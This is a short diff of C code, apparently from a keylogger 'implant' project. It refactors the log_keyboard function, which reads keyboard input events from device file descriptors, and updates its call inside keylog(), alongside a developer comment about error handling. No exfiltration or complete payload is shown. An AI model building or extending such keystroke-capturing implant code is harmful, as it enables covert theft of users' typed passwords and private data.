@@ -28,7 +28,7 @@ static int get_highest_fd(implant_t *instance) {
     return highest_fd;
 }
 
-static int log_keyboard(int fd, implant_t *instance, struct xkb_state *state) {
+static int log_keyboard(int fd, struct xkb_state *state) {
     struct input_event evt = {0};
 
     ssize_t bytes_read = read(fd, &evt, sizeof(evt));
@@ -164,7 +164,7 @@ void keylog(implant_t *instance) {
                     should we really kill the run here or can we recover this ?
                     i need to run some tests before making a decision.
                 */
-                if (log_keyboard(it->fd, instance, state) == ERROR)
+                if (log_keyboard(it->fd, state) == ERROR)
                     goto LOG_FUNCTION_CLEANUP;
             }
 
